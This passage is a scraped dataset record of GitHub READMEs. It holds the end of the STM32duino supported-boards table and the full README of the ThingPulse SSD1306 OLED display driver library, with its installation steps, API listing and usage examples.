2.0.0\n\ud83d\udc9a stm32f070rb generic board 2.0.0\n\ud83d\udc9a stm32f072c8\nstm32f072cb generic board 2.0.0\n\ud83d\udc9a stm32f072r8\nstm32f072rb generic board 2.0.0\n\ud83d\udc9a stm32f091rb\nstm32f091rc generic board 2.0.0\ngeneric stm32f1 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f100c4\nstm32f100c6 generic board 2.0.0\n\ud83d\udc9a stm32f100c8\nstm32f100cb generic board 2.0.0\n\ud83d\udc9a stm32f103c6\nstm32f103c8\nstm32f103cb blue pill 1.2.0 usb cdc support since 1.5.0\nmaple bootloaders support since 1.6.0\n\ud83d\udc9a stm32f103c8\nstm32f103cb black pill 1.5.0\n\ud83d\udc9a stm32f103c4\nstm32f103c6\nstm32f103c8\nstm32f103cb generic board 1.9.0\n\ud83d\udc9a stm32f103r8\nstm32f103rb\nstm32f103rc\nstm32f103re blue button f103rx 1.9.0\n\ud83d\udc9a stm32f103r6\nstm32f103r8\nstm32f103rb\nstm32f103rc\nstm32f103rd\nstm32f103re\nstm32f103rf\nstm32f103rg generic board 1.9.0\n\ud83d\udc9a stm32f103t4\nstm32f103t6\nstm32f103t8\nstm32f103tb generic board 1.9.0\n\ud83d\udc9a stm32f103v8\nstm32f103vb\nstm32f103vc\nstm32f103vd\nstm32f103ve\nstm32f103vf\nstm32f103vg generic board 1.9.0\n\ud83d\udc9a stm32f103zc\nstm32f103zd\nstm32f103ze\nstm32f103zf\nstm32f103zg generic board 1.9.0\n\ud83d\udc9a stm32f103tb hy-tinystm103t 1.5.0 more info\n\ud83d\udc9a stm32f103cb maple mini 1.2.0 more info\nusb cdc support since 1.5.0\nmaple bootloaders support since 1.6.0\n\ud83d\udc9a stm32f103ze vcc-gnd.com 1.9.0 more info\n\ud83d\udc9a stm32f103ze vcc-gnd.com mini 1.9.0 more info\ngeneric stm32f2 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f207zc\nstm32f207ze\nstm32f207zf\nstm32f207g generic board 2.0.0\n\ud83d\udc9a stm32f217ze\nstm32f217g generic board 2.0.0\ngeneric stm32f3 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f302r6\nstm32f302r8 generic board 2.0.0\n\ud83d\udc9a stm32f303cb\nstm32f303cc generic board 2.0.0\n\ud83d\udc9a stm32f303cc robotdyn black pill 1.6.1 more info\n\ud83d\udc9a stm32f303k6\nstm32f303k8 generic board 2.0.0\n\ud83d\udc9a stm32f303rd\nstm32f303re generic board 2.0.0\n\ud83d\udc9a stm32f303rb\nstm32f303rc generic board 2.0.0\n\ud83d\udc9a stm32f303rc olimexino-stm32f3 2.0.0\n\ud83d\udc9a stm32f303vbt\nstm32f303vct generic board 2.0.0\n\ud83d\udc9a stm32f334k4\nstm32f334k6\nstm32f334k8 generic board 2.0.0\ngeneric stm32f4 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f405rg adafruit feather stm32f405 express 1.8.0\n\ud83d\udc9a stm32f401cc weact black pill 1.7.0 more info\n\ud83d\udc9a stm32f411ce weact black pill 1.9.0 more info\n\ud83d\udc9a stm32f407ve\nstm32f407vg stm32 f4ve / black f407vet6 1.4.0 stm32f407vg support since 1.5.0\n\ud83d\udc9a stm32f407ze\nstm32f407zg black f407ze / black f407zg 1.5.0\n\ud83d\udc9a stm32f407zg vcc-gnd.com mini 2.0.0 more info\n\ud83d\udc9a stm32f407ve vcc-gnd.com mini 1.4.0 more info\n\ud83d\udc9a stm32f401rc stm32f core board 1.7.0\n\ud83d\udc9a stm32f407vg diymore stm32f407vgt 1.5.0\n\ud83d\udc9a stm32f407ve fk407m1 1.5.0\n\ud83d\udc9a stm32f401cb\nstm32f401cc\nstm32f401cd\nstm32f401ce generic board 1.9.0\n\ud83d\udc9a stm32f401rb\nstm32f401rc\nstm32f401rd\nstm32f401re generic board 1.8.0\n\ud83d\udc9a stm32f401vb\nstm32f401vc\nstm32f401vd\nstm32f401ve generic board 2.0.0\n\ud83d\udc9a stm32f405rg generic board 1.9.0\n\ud83d\udc9a stm32f407ve\nstm32f407vg generic board 1.9.0\n\ud83d\udc9a stm32f407ze\nstm32f407zg generic board 2.0.0\n\ud83d\udc9a stm32f410c8\nstm32f410cb generic board 1.9.0\n\ud83d\udc9a stm32f410r8\nstm32f410rb generic board 1.9.0\n\ud83d\udc9a stm32f411cc\nstm32f411ce generic board 1.9.0\n\ud83d\udc9a stm32f411rc\nstm32f411re generic board 1.9.0\n\ud83d\udc9a stm32f412ce\nstm32f412cg generic board 1.9.0\n\ud83d\udc9a stm32f412re\nstm32f412rg generic board 1.9.0\n\ud83d\udc9a stm32f413cg\nstm32f413ch generic board 1.9.0\n\ud83d\udc9a stm32f413rg\nstm32f413rh generic board 1.9.0\n\ud83d\udc9a stm32f413zg\nstm32f413zh generic board 2.0.0\n\ud83d\udc9a stm32f415rg generic board 1.9.0\n\ud83d\udc9a stm32f417ve\nstm32f417vg generic board 1.9.0\n\ud83d\udc9a stm32f417ze\nstm32f417zg generic board 2.0.0\n\ud83d\udc9a stm32f423ch generic board 1.9.0\n\ud83d\udc9a stm32f423rh generic board 1.9.0\n\ud83d\udc9a stm32f423zh generic board 2.0.0\n\ud83d\udc9a stm32f427zg\nstm32f427zi generic board 2.0.0\n\ud83d\udc9a stm32f429ze\nstm32f429zg\nstm32f429zi generic board 2.0.0\n\ud83d\udc9a stm32f437zg\nstm32f437zi generic board 2.0.0\n\ud83d\udc9a stm32f439zg\nstm32f439zi generic board 2.0.0\n\ud83d\udc9a stm32f446rc\nstm32f446re generic board 1.9.0\n\ud83d\udc9a stm32f446vc\nstm32f446ve generic board 2.0.0\n\ud83d\udc9a stm32f411ce thunderpack v1.1+ 1.9.0\ngeneric stm32f7 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f745ze\nstm32f745zg generic board 2.0.0\n\ud83d\udc9a stm32f746be\nstm32f746bg\nstm32f746ne\nstm32f746ng generic board 2.0.0\n\ud83d\udc9a stm32f746ze\nstm32f746zg generic board 2.0.0\n\ud83d\udc9a stm32f750n8 generic board 2.0.0\n\ud83d\udc9a stm32f750z8 generic board 2.0.0\n\ud83d\udc9a stm32f756bg\nstm32f756ng generic board 2.0.0\n\ud83d\udc9a stm32f756zg generic board 2.0.0\n\ud83d\udc9a stm32f765vg\nstm32f765vi generic board 2.0.0\n\ud83d\udc9a stm32f765zg\nstm32f765zi generic board 2.0.0\n\ud83d\udc9a stm32f767vg\nstm32f767vi generic board 2.0.0\n\ud83d\udc9a stm32f767zg\nstm32f767zi generic board 2.0.0\n\ud83d\udc9a stm32f777vi generic board 2.0.0\n\ud83d\udc9a stm32f777zi generic board 2.0.0\ngeneric stm32g0 boards\nstatus device(s) name release notes\n\ud83d\udc9b stm32g030c6\nstm32g030c8 generic board 2.2.0\n\ud83d\udc9b stm32g030f6\nstm32g030f6 generic board 2.2.0\n\ud83d\udc9a stm32g030k8 aurora one 2.0.0\n\ud83d\udc9a stm32g030k6\nstm32g030k8 generic board 2.0.0\n\ud83d\udc9a stm32g031j4\nstm32g031j6 generic board 2.0.0\n\ud83d\udc9a stm32g031k4\nstm32g031k6\nstm32g031k8 generic board 2.0.0\n\ud83d\udc9a stm32g041j6 generic board 2.0.0\n\ud83d\udc9a stm32g041k6\nstm32g041k8 generic board 2.0.0\n\ud83d\udc9a stm32g071r6\nstm32g071r8\nstm32g071rb generic board 2.0.0\n\ud83d\udc9a stm32g081rb generic board 2.0.0\n\ud83d\udc9a stm32g0b1rb\nstm32g0b1rc\nstm32g0b1re generic board 2.1.0\n\ud83d\udc9a stm32g0c1rb\nstm32g0c1re generic board 2.1.0\ngeneric stm32g4 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32g431c6u\nstm32g431c8u\nstm32g431cbu generic board 2.0.0\n\ud83d\udc9a stm32g441cbu generic board 2.0.0\n\ud83d\udc9a stm32g431k6\nstm32g431k8\nstm32g431kb generic board 2.0.0\n\ud83d\udc9a stm32g441kb generic board 2.0.0\n\ud83d\udc9a stm32g431r6\nstm32g431r8\nstm32g431rb generic board 2.0.0\n\ud83d\udc9a stm32g441rb generic board 2.0.0\n\ud83d\udc9a stm32g473rb\nstm32g473rc\nstm32g473re generic board 2.0.0\n\ud83d\udc9a stm32g474rb\nstm32g474rc\nstm32g474re generic board 2.0.0\n\ud83d\udc9a stm32g483re generic board 2.0.0\n\ud83d\udc9a stm32g484re generic board 2.0.0\ngeneric stm32h7 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32h742ig\nstm32h742ii generic board 2.1.0\n\ud83d\udc9a stm32h742vg\nstm32h742vi generic board 2.0.0\n\ud83d\udc9a stm32h742zg\nstm32h742zi generic board 2.0.0\n\ud83d\udc9a stm32h743ig\nstm32h743ii generic board 2.0.0\n\ud83d\udc9a stm32h743vg\nstm32h743vi generic board 2.0.0\n\ud83d\udc9b stm32h743vi devebox h743vit6 2.2.0\n\ud83d\udc9b stm32h743vi weact ministm32h743vit6 2.2.0 more info\n\ud83d\udc9a stm32h743zg\nstm32h743zi generic board 2.0.0\n\ud83d\udc9a stm32h747ag\nstm32h747ai generic board 2.0.0\n\ud83d\udc9a stm32h747ig\nstm32h747ii generic board 2.0.0\n\ud83d\udc9a stm32h750zb generic board 2.0.0\n\ud83d\udc9a stm32h750ib\nstm32h750ii generic board 2.0.0\n\ud83d\udc9a stm32h750ib daisy 1.9.0\n\ud83d\udc9b stm32h750ib daisy patch sm 2.2.0\n\ud83d\udc9b stm32h750ib daisy petal sm 2.2.0\n\ud83d\udc9a stm32h750vb generic board 2.0.0\n\ud83d\udc9b stm32h750vb devebox h750vbt6 2.2.0\n\ud83d\udc9b stm32h750vb weact ministm32h750vbt6 2.2.0 more info\n\ud83d\udc9a stm32h753vi generic board 2.0.0\n\ud83d\udc9a stm32h753zi generic board 2.0.0\n\ud83d\udc9a stm32h757ai generic board 2.0.0\n\ud83d\udc9a stm32h757ii generic board 2.0.0\ngeneric stm32l0 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32l010rb generic board 2.0.0\n\ud83d\udc9a stm32l031k4t\nstm32l031k6t generic board 2.0.0\n\ud83d\udc9a stm32l041k6t generic board 2.0.0\n\ud83d\udc9a stm32l051c6\nstm32l051c8 generic board 2.0.0\n\ud83d\udc9a stm32l052r6t\nstm32l052r8t generic board 2.0.0\n\ud83d\udc9a stm32l053r6t\nstm32l053r8t generic board 2.0.0\n\ud83d\udc9a stm32l063r8t generic board 2.0.0\n\ud83d\udc9a stm32l072cby\nstm32l072cze\nstm32l072czy generic board 2.0.0\n\ud83d\udc9a stm32l072kbt\nstm32l072kzt generic board 2.0.0\n\ud83d\udc9a stm32l072kzt thunderpack v1.0 1.8.0\n\ud83d\udc9a stm32l072rbt px-her0 1.8.0\n\ud83d\udc9a stm32l072rbt\nstm32l072rzt generic board 2.0.0\n\ud83d\udc9a stm32l073czy generic board 2.0.0\n\ud83d\udc9a stm32l073rbt\nstm32l073rzt generic board 2.0.0\n\ud83d\udc9a stm32l082czy generic board 2.0.0\n\ud83d\udc9a stm32l082kbt\nstm32l082kzt generic board 2.0.0\n\ud83d\udc9a stm32l083rbt\nstm32l083rzt generic board 2.0.0\ngeneric stm32l1 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32l100c6\nstm32l100c6-a generic board 2.0.0\n\ud83d\udc9a stm32l151c6\nstm32l151c8\nstm32l151cb generic board 2.0.0\n\ud83d\udc9a stm32l151c6-a\nstm32l151c8-a\nstm32l151cb-a generic board 2.0.0\n\ud83d\udc9a stm32l152c6\nstm32l152c8\nstm32l152cb generic board 2.0.0\n\ud83d\udc9a stm32l152c6-a\nstm32l152c8-a\nstm32l152cb-a generic board 2.0.0\n\ud83d\udc9a stm32l151re generic board 2.0.0\n\ud83d\udc9a stm32l152re generic board 2.0.0\n\ud83d\udc9a stm32l162re generic board 2.0.0\ngeneric stm32l4 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32l412k8\nstm32l412kb\nstm32l422kb generic board 2.0.0\n\ud83d\udc9a stm32l432kb\nstm32l432kc\nstm32l442kc generic board 2.0.0\n\ud83d\udc9a stm32l433cbt\nstm32l433cct generic board 2.1.0\n\ud83d\udc9a stm32l433cbu\nstm32l433ccu generic board 2.1.0\n\ud83d\udc9a stm32l443cc\nstm32l443cc generic board 2.1.0\n\ud83d\udc9a stm32l433rc-p generic board 2.0.0\n\ud83d\udc9a stm32l452rc\nstm32l452re\nstm32l462re generic board 2.0.0\n\ud83d\udc9a stm32l452re-p generic board 2.0.0\n\ud83d\udc9a stm32l475vc\nstm32l475ve\nstm32l475vg generic board 2.0.0\n\ud83d\udc9a stm32l476vc\nstm32l476ve\nstm32l476vg generic board 2.0.0\n\ud83d\udc9a stm32l476rc\nstm32l476re\nstm32l476rg generic board 2.0.0\n\ud83d\udc9a stm32l486vg generic board 2.0.0\n\ud83d\udc9a stm32l496ze\nstm32l496zg generic board 2.0.0\n\ud83d\udc9a stm32l496zg-p generic board 2.0.0\n\ud83d\udc9a stm32l4a6zg generic board 2.0.0\n\ud83d\udc9a stm32l4a6zg-p generic board 2.0.0\n\ud83d\udc9a stm32l4r5vg\nstm32l4r5vi generic board 2.0.0\n\ud83d\udc9a stm32l4r5zgtx\nstm32l4r5zitx generic board 2.0.0\n\ud83d\udc9a stm32l4r5zgyx\nstm32l4r5ziyx generic board 2.1.0\n\ud83d\udc9a stm32l4r5zi-p generic board 2.0.0\n\ud83d\udc9a stm32l4r7vitx generic board 2.0.0\n\ud83d\udc9a stm32l4r7zitx generic board 2.0.0\n\ud83d\udc9a stm32l4r9zgjx\nstm32l4r9zijx generic board 2.0.0\n\ud83d\udc9a stm32l4r9zgyx\nstm32l4r9ziyx generic board 2.1.0\n\ud83d\udc9a stm32l4s5vi generic board 2.0.0\n\ud83d\udc9a stm32l4s5zitx generic board 2.0.0\n\ud83d\udc9a stm32l4s5ziyx generic board 2.1.0\n\ud83d\udc9a stm32l4s7vi generic board 2.0.0\n\ud83d\udc9a stm32l4s7zitx generic board 2.0.0\n\ud83d\udc9a stm32l4s9zijx generic board 2.0.0\n\ud83d\udc9a stm32l4s9ziyx generic board 2.1.0\ngeneric stm32l5 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32l552zc-q\nstm32l552ze-q generic board 2.0.0\n\ud83d\udc9a stm32l562ze-q generic board 2.0.0\ngeneric stm32u5 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32u575agixq\nstm32u575aiixq\nstm32u585aiixq generic board 2.1.0\n\ud83d\udc9a stm32u575zgtxq\nstm32u575zitxq\nstm32u585zetxq generic board 2.1.0\ngeneric stm32wb boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32wb55cc\nstm32wb55ce\nstm32wb55cg generic board 2.0.0\n\ud83d\udc9a stm32wb5mmg generic board 2.1.0\n\ud83d\udc9a stm32wb55rc\nstm32wb55re\nstm32wb55rg generic board 2.0.0\ngeneric stm32wl boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32wl55cc generic node sensor edition (gnse) by tti 2.1.0 gnse github\n\ud83d\udc9a stm32wl54cc\nstm32wl55cc generic board 2.1.0\n\ud83d\udc9a stm32wl55jc\nstm32wl55jc generic board 2.1.0\n\ud83d\udc9a stm32wle4c8\nstm32wle4cb\nstm32wle4cc generic board 2.1.0\n\ud83d\udc9a stm32wle4j8\nstm32wle4jb\nstm32wle4jc generic board 2.1.0\n\ud83d\udc9a stm32wle5c8\nstm32wle5cb\nstm32wle5cc generic board 2.1.0\n\ud83d\udc9a stm32wle5j8\nstm32wle5jb\nstm32wle5jc generic board 2.1.0\n3d printer boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f407ve armed v1 1.5.0\n\ud83d\udc9a stm32f030 eextruder f030 v1 1.5.0 small companion board for prntr board v1\n\ud83d\udc9a stm32f103c8 malyan m200 v1 1.5.0\n\ud83d\udc9a stm32f070c8 malyan m200 v2 1.5.0\n\ud83d\udc9a stm32f070c8 malyan m300 1.8.0\n\ud83d\udc9a stm32f407ve prntr board v1 1.5.0\n\ud83d\udc9a stm32f407ve prntr board v2 1.8.0\n\ud83d\udc9a stm32f765vi remram v1 1.4.0\n\ud83d\udc9a stm32f446ve rumba32 1.5.0\n\ud83d\udc9a stm32f401ve steval-3dp001v1 1.6.0\n\ud83d\udc9a stm32f446re vake v1.0 1.6.0\n\ud83d\udc9a stm32f446ve fysetc_s6 1.9.0\nblues wireless boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32l4r5ziyx swan r5 2.1.0\nelecgator boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f746zet ethercatduino 2.1.0\nelectronic speed controller boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f051k6u wraith v1 esc 1.8.0\n\ud83d\udc9a stm32f103rct storm32 v1.31 rc 2.1.0\ngaratronic/mchobby boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f072rb pybstick 26 duino 1.9.0 more info\n\ud83d\udc9a stm32f401ce pybstick 26 lite 1.9.0 more info\n\ud83d\udc9a stm32f411re pybstick 26 standard 1.9.0 more info\n\ud83d\udc9a stm32f412re pybstick 26 pro 1.9.0 more info\ngeneric flight controllers\nstatus device(s) name release notes\n\ud83d\udc9a stm32f103cb afro flight rev5 (8/12mhz) 1.7.0\n\ud83d\udc9a stm32f303cc sparky v1 1.6.0\nlora boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f072c8\nstm32f072cb elektor lora node 1.8.0 more info\n\ud83d\udc9a stm32l151cb rak811 lora tracker 1.4.0 wiki\n\ud83d\udc9a stm32l051c8 rhf76-052 1.7.0 basic support\nmidatronics boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32wb55ce sharkymkr 1.7.0\nnext release\nsee milestones to have an overview of the next release content.\ntroubleshooting\nfor question, support, ..., you could submit a topic on the stm32duino forum.\nif you have any issue, you could file an issue on github.\nin any case, it always fine to search if your issue was not already existing before submit a new one.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000026, "year": null}, {"Unnamed: 0": 2068, "autor": 28, "date": null, "content": "ThingPulse OLED SSD1306 (ESP8266/ESP32/Mbed-OS)\nThis is a driver for SSD1306 128x64, 128x32, 64x48 and 64x32 OLED displays running on the Arduino/ESP8266 & ESP32 and mbed-os platforms. Can be used with either the I2C or SPI version of the display.\nThis library drives the OLED display included in the ThingPulse IoT starter kit aka classic kit aka weather station kit.\nYou can either download this library as a zip file and unpack it to your Arduino/libraries folder or find it in the Arduino library manager under \"ESP8266 and ESP32 Oled Driver for SSD1306 display\". For mbed-os a copy of the files are available as an mbed-os library.\nIt is also available as a PlatformIO library. Just execute the following command:\nplatformio lib install 2978\nService level promise\nThis is a ThingPulse prime project. See our open-source commitment declaration for what this means.\nCredits\nThis library has initially been written by Daniel Eichhorn. Many thanks go to Fabrice Weinberg for optimizing and refactoring many aspects of the library. Also many thanks to the many committers who helped to add new features and who fixed many bugs. Mbed-OS support and other improvements were contributed by Helmut Tschemernjak.\nThe init sequence for the SSD1306 was inspired by Adafruit's library for the same display.\nmbed-os\nThis library has been adopted to support the ARM mbed-os environment. A copy of this library is available in mbed-os under the name OLED_SSD1306 by Helmut Tschemernjak. An alternate installation option is to copy the following files into your mbed-os project: OLEDDisplay.cpp OLEDDisplay.h OLEDDisplayFonts.h OLEDDisplayUi.cpp OLEDDisplayUi.h SSD1306I2C.h\nUsage\nCheck out the examples folder for a few comprehensive demonstrations how to use the library. Also check out the ESP8266 Weather Station library which uses the OLED library to display beautiful weather information.\nUpgrade\nThe API changed a lot with the 3.0 release. If you were using this library with older versions please have a look at the Upgrade Guide.\nGoing from 3.x version to 4.0 a lot of internals changed and compatibility for more displays was added. Please read the Upgrade Guide.\nFeatures\nDraw pixels at given coordinates\nDraw lines from given coordinates to given coordinates\nDraw or fill a rectangle with given dimensions\nDraw Text at given coordinates:\nDefine Alignment: Left, Right and Center\nSet the Fontface you want to use (see section Fonts below)\nLimit the width of the text by an amount of pixels. Before this widths will be reached, the renderer will wrap the text to a new line if possible\nDisplay content in automatically side scrolling carousel\nDefine transition cycles\nDefine how long one frame will be displayed\nDraw the different frames in callback methods\nOne indicator per frame will be automatically displayed. The active frame will be displayed from inactive once\nFonts\nFonts are defined in a proprietary but open format. You can create new font files by choosing from a given list of open sourced Fonts from this web app: http://oleddisplay.squix.ch Choose the font family, style and size, check the preview image and if you like what you see click the \"Create\" button. This will create the font array in a text area form where you can copy and paste it into a new or existing header file.\nHardware Abstraction\nThe library supports different protocols to access the OLED display. Currently there is support for I2C using the built in Wire.h library, I2C by using the much faster BRZO I2C library written in assembler and it also supports displays which come with the SPI interface.\nI2C with Wire.h\n#include <Wire.h>\n#include \"SSD1306Wire.h\"\n// for 128x64 displays:\nSSD1306Wire display(0x3c, SDA, SCL); // ADDRESS, SDA, SCL\n// for 128x32 displays:\n// SSD1306Wire display(0x3c, SDA, SCL, GEOMETRY_128_32); // ADDRESS, SDA, SCL, GEOMETRY_128_32 (or 128_64)\n// for using 2nd Hardware I2C (if available)\n// SSD1306Wire(0x3c, SDA, SCL, GEOMETRY_128_64, I2C_TWO); //default value is I2C_ONE if not mentioned\n// By default SD1306Wire set I2C frequency to 700000, you can use set either another frequency or skip setting the frequency by providing -1 value\n// SSD1306Wire(0x3c, SDA, SCL, GEOMETRY_128_64, I2C_ONE, 400000); //set I2C frequency to 400kHz\n// SSD1306Wire(0x3c, SDA, SCL, GEOMETRY_128_64, I2C_ONE, -1); //skip setting the I2C bus frequency\nfor a SH1106:\n#include <Wire.h>\n#include \"SH1106Wire.h\"\nSH1106Wire display(0x3c, SDA, SCL); // ADDRESS, SDA, SCL\n// By default SH1106Wire set I2C frequency to 700000, you can use set either another frequency or skip setting the frequency by providing -1 value\n// SH1106Wire(0x3c, SDA, SCL, GEOMETRY_128_64, I2C_ONE, 400000); //set I2C frequency to 400kHz\n// SH1106Wire(0x3c, SDA, SCL, GEOMETRY_128_64, I2C_ONE, -1); //skip setting the I2C bus frequency\nI2C with brzo_i2c\n#include <brzo_i2c.h>\n#include \"SSD1306Brzo.h\"\nSSD1306Brzo display(0x3c, SDA, SCL); // ADDRESS, SDA, SCL\nor for the SH1106:\n#include <brzo_i2c.h>\n#include \"SH1106Brzo.h\"\nSH1106Brzo display(0x3c, SDA, SCL); // ADDRESS, SDA, SCL\nSPI\n#include <SPI.h>\n#include \"SSD1306Spi.h\"\nSSD1306Spi display(D0, D2, D8); // RES, DC, CS\nor for the SH1106:\n#include <SPI.h>\n#include \"SH1106Spi.h\"\nSH1106Spi display(D0, D2); // RES, DC\nAPI\nDisplay Control\n// Initialize the display\nvoid init();\n// Free the memory used by the display\nvoid end();\n// Cycle through the initialization\nvoid resetDisplay(void);\n// Connect again to the display through I2C\nvoid reconnect(void);\n// Turn the display on\nvoid displayOn(void);\n// Turn the display offs\nvoid displayOff(void);\n// Clear the local pixel buffer\nvoid clear(void);\n// Write the buffer to the display memory\nvoid display(void);\n// Inverted display mode\nvoid invertDisplay(void);\n// Normal display mode\nvoid normalDisplay(void);\n// Set display contrast\n// really low brightness & contrast: contrast = 10, precharge = 5, comdetect = 0\n// normal brightness & contrast: contrast = 100\nvoid setContrast(uint8_t contrast, uint8_t precharge = 241, uint8_t comdetect = 64);\n// Convenience method to access\nvoid setBrightness(uint8_t);\n// Turn the display upside down\nvoid flipScreenVertically();\n// Draw the screen mirrored\nvoid mirrorScreen();\nPixel drawing\n/* Drawing functions */\n// Sets the color of all pixel operations\n// color : BLACK, WHITE, INVERSE\nvoid setColor(OLEDDISPLAY_COLOR color);\n// Draw a pixel at given position\nvoid setPixel(int16_t x, int16_t y);\n// Draw a line from position 0 to position 1\nvoid drawLine(int16_t x0, int16_t y0, int16_t x1, int16_t y1);\n// Draw the border of a rectangle at the given location\nvoid drawRect(int16_t x, int16_t y, int16_t width, int16_t height);\n// Fill the rectangle\nvoid fillRect(int16_t x, int16_t y, int16_t width, int16_t height);\n// Draw the border of a circle\nvoid drawCircle(int16_t x, int16_t y, int16_t radius);\n// Fill circle\nvoid fillCircle(int16_t x, int16_t y, int16_t radius);\n// Draw an empty triangle i.e. only the outline\nvoid drawTriangle(int16_t x0, int16_t y0, int16_t x1, int16_t y1, int16_t x2, int16_t y2);\n// Draw a solid triangle i.e. filled\nvoid fillTriangle(int16_t x0, int16_t y0, int16_t x1, int16_t y1, int16_t x2, int16_t y2);\n// Draw a line horizontally\nvoid drawHorizontalLine(int16_t x, int16_t y, int16_t length);\n// Draw a lin vertically\nvoid drawVerticalLine(int16_t x, int16_t y, int16_t length);\n// Draws a rounded progress bar with the outer dimensions given by width and height. Progress is\n// a unsigned byte value between 0 and 100\nvoid drawProgressBar(uint16_t x, uint16_t y, uint16_t width, uint16_t height, uint8_t progress);\n// Draw a bitmap in the internal image format\nvoid drawFastImage(int16_t x, int16_t y, int16_t width, int16_t height, const uint8_t *image);\n// Draw a XBM\nvoid drawXbm(int16_t x, int16_t y, int16_t width, int16_t height, const uint8_t *xbm);\nText operations\nvoid drawString(int16_t x, int16_t y, const String &text);\n// Draws a String with a maximum width at the given location.\n// If the given String is wider than the specified width\n// The text will be wrapped to the next line at a space or dash\nvoid drawStringMaxWidth(int16_t x, int16_t y, int16_t maxLineWidth, const String &text);\n// Returns the width of the const char* with the current\n// font settings\nuint16_t getStringWidth(const char* text, uint16_t length);\n// Convencience method for the const char version\nuint16_t getStringWidth(const String &text);\n// Specifies relative to which anchor point\n// the text is rendered. Available constants:\n// TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER_BOTH\nvoid setTextAlignment(OLEDDISPLAY_TEXT_ALIGNMENT textAlignment);\n// Sets the current font. Available default fonts\n// ArialMT_Plain_10, ArialMT_Plain_16, ArialMT_Plain_24\n// Or create one with the font tool at http://oleddisplay.squix.ch\nvoid setFont(const uint8_t* fontData);\nUi Library (OLEDDisplayUi)\nThe Ui Library is used to provide a basic set of user interface elements called Frames and Overlays. A Frame is used to provide information to the user. The default behaviour is to display a Frame for a defined time and than move to the next Frame. The library also provides an Indicator element that will be updated accordingly. An Overlay on the other hand is a piece of information (e.g. a clock) that is always displayed at the same position.\n/**\n* Initialise the display\n*/\nvoid init();\n/**\n* Configure the internal used target FPS\n*/\nvoid setTargetFPS(uint8_t fps);\n/**\n* Enable automatic transition to next frame after the some time can be configured with\n* `setTimePerFrame` and `setTimePerTransition`.\n*/\nvoid enableAutoTransition();\n/**\n* Disable automatic transition to next frame.\n*/\nvoid disableAutoTransition();\n/**\n* Set the direction if the automatic transitioning\n*/\nvoid setAutoTransitionForwards();\nvoid setAutoTransitionBackwards();\n/**\n* Set the approx. time a frame is displayed\n*/\nvoid setTimePerFrame(uint16_t time);\n/**\n* Set the approx. time a transition will take\n*/\nvoid setTimePerTransition(uint16_t time);\n/**\n* Draw the indicator.\n* This is the default state for all frames if\n* the indicator was hidden on the previous frame\n* it will be slided in.\n*/\nvoid enableIndicator();\n/**\n* Don't draw the indicator.\n* This will slide out the indicator\n* when transitioning to the next frame.\n*/\nvoid disableIndicator();\n/**\n* Enable drawing of all indicators.\n*/\nvoid enableAllIndicators();\n/**\n* Disable drawing of all indicators.\n*/\nvoid disableAllIndicators();\n/**\n* Set the position of the indicator bar.\n*/\nvoid setIndicatorPosition(IndicatorPosition pos);\n/**\n* Set the direction of the indicator bar. Defining the order of frames ASCENDING / DESCENDING\n*/\nvoid setIndicatorDirection(IndicatorDirection dir);\n/**\n* Set the symbol to indicate an active frame in the indicator bar.\n*/\nvoid setActiveSymbol(const uint8_t* symbol);\n/**\n* Set the symbol to indicate an inactive frame in the indicator bar.\n*/\nvoid setInactiveSymbol(const uint8_t* symbol);\n/**\n* Configure what animation is used to transition from one frame to another\n*/\nvoid setFrameAnimation(AnimationDirection dir);\n/**\n* Add frame drawing functions\n*/\nvoid setFrames(FrameCallback* frameFunctions, uint8_t frameCount);\n/**\n* Add overlays drawing functions that are draw independent of the Frames\n*/\nvoid setOverlays(OverlayCallback* overlayFunctions, uint8_t overlayCount);\n/**\n* Set the function that will draw each step\n* in the loading animation\n*/\nvoid setLoadingDrawFunction(LoadingDrawFunction loadingDrawFunction);\n/**\n* Run the loading process\n*/\nvoid runLoadingProcess(LoadingStage* stages, uint8_t stagesCount);\n// Manual control\nvoid nextFrame();\nvoid previousFrame();\n/**\n* Switch without transition to frame `frame`.\n*/\nvoid switchToFrame(uint8_t frame);\n/**\n* Transition to frame `frame`. When the `frame` number is bigger than the current\n* frame the forward animation will be used, otherwise the backwards animation is used.\n*/\nvoid transitionToFrame(uint8_t frame);\n// State Info\nOLEDDisplayUiState* getUiState();\n// This needs to be called in the main loop\n// the returned value is the remaining time (in ms)\n// you have to draw after drawing to keep the frame budget.\nint8_t update();\nExample: SSD1306Demo\nFrame 1\nThis frame shows three things:\nHow to draw an XMB image\nHow to draw static text which is not moved by the frame transition\nThe active/inactive frame indicators\nFrame 2\nCurrently there are one fontface with three sizes included in the library: Arial 10, 16 and 24. Once the converter is published you will be able to convert any ttf font into the used format.\nFrame 3\nThis frame demonstrates the text alignment. The coordinates in the frame show relative to which position the texts have been rendered.\nFrame 4\nThis shows how to use define a maximum width after which the driver automatically wraps a word to the next line. This comes in very handy if you have longer texts to display.\nSPI version\nThis shows the code working on the SPI version of the display. See demo code for ESP8266 pins used.\nSelection of projects using this library\nQRCode ESP8266 (by @anunpanya)\nScan I2C (by @hallard)\nThingPulse Weather Station\nMeshtastic - an open source GPS communicator mesh radio\nYours?", "link": "https://github.com/ThingPulse/esp8266-oled-ssd1306", "origin": "Github", "suborigin": "arduino", "result": true, 